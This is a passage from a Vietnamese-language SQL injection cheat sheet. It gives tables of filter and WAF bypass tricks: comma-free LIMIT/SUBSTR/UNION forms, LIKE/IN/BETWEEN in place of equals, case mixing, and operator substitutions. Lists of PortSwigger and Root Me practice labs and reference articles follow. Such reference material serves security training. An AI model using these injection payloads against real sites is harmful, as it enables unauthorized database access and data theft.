### Không cho phép dấu phẩy

Vượt qua bằng cách dùng `OFFSET`, `FROM` và `JOIN`.

| Bị cấm               | Cách vượt qua                                                                        |
| ------------------- | ------------------------------------------------------------------------------------ |
| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0`                                                                   |
| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)`                                                         |
| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |

### Không cho phép dấu bằng

Vượt qua bằng cách dùng LIKE/NOT IN/IN/BETWEEN

| Cách vượt qua | Ví dụ SQL                                  |
| --------- | ------------------------------------------ |
| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |
| `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |
| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |

### Thay đổi kiểu chữ (Case Modification)

Vượt qua bằng cách dùng chữ hoa/chữ thường.

| Cách vượt qua | Kỹ thuật    |
| ------ | ---------- |
| `AND`  | Chữ hoa    |
| `and`  | Chữ thường |
| `aNd`  | Kiểu chữ hỗn hợp |

Vượt qua bằng cách dùng từ khóa không phân biệt kiểu chữ hoặc một toán tử tương đương.

| Bị cấm | Cách vượt qua                      |
| --------- | --------------------------- |
| `AND`     | `&&`                        |
| `OR`      | `\|\|`                      |
| `=`       | `LIKE`, `REGEXP`, `BETWEEN` |
| `>`       | `NOT BETWEEN 0 AND X`       |
| `WHERE`   | `HAVING`                    |

## Bài Lab

* [PortSwigger - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
* [PortSwigger - SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
* [PortSwigger - SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
* [PortSwigger - SQL Labs](https://portswigger.net/web-security/all-labs#sql-injection)
* [Root Me - SQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)
* [Root Me - SQL injection - Authentication - GBK](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK)
* [Root Me - SQL injection - String](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)
* [Root Me - SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)
* [Root Me - SQL injection - Routed](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)
* [Root Me - SQL injection - Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)
* [Root Me - SQL injection - Insert](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert)
* [Root Me - SQL injection - File reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)
* [Root Me - SQL injection - Time based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)
* [Root Me - SQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Blind)
* [Root Me - SQL injection - Second Order](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Second-Order)
* [Root Me - SQL injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)
* [Root Me - SQL Truncation](https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation)

## Tài liệu tham khảo

* [A Novel Technique for SQL Injection in PDO's Prepared Statements - Adam Kues - July 21, 2025](https://web.archive.org/web/20251017002820/https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)
* [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection - Not So Secure - February 9, 2018](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)
* [Implement a Blind Error-Based SQLMap payload for SQLite - soka - August 24, 2023](https://web.archive.org/web/20250513112724/https://sokarepo.github.io/web/2023/08/24/implement-blind-sqlite-sqlmap.html)
* [Manual SQL Injection Discovery Tips - Gerben Javado - August 26, 2017](https://web.archive.org/web/20170826221724/https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
* [NetSPI SQL Injection Wiki - NetSPI - December 21, 2017](https://web.archive.org/web/20171221044609/https://sqlwiki.netspi.com/)
* [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](https://web.archive.org/web/20260109024910/https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [SQLi Cheatsheet - NetSparker - March 19, 2022](https://web.archive.org/web/20220219223426/https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [SQLi in INSERT worse than SELECT - Mathias Karlsson - February 14, 2017](https://web.archive.org/web/20231004093323/https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
* [SQLi Optimization and Obfuscation Techniques - Roberto Salgado - July 31, 2013](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf)
* [The SQL Injection Knowledge base - Roberto Salgado - May 29, 2013](https://web.archive.org/web/20260302110304/https://www.websec.ca/kb/sql_injection)
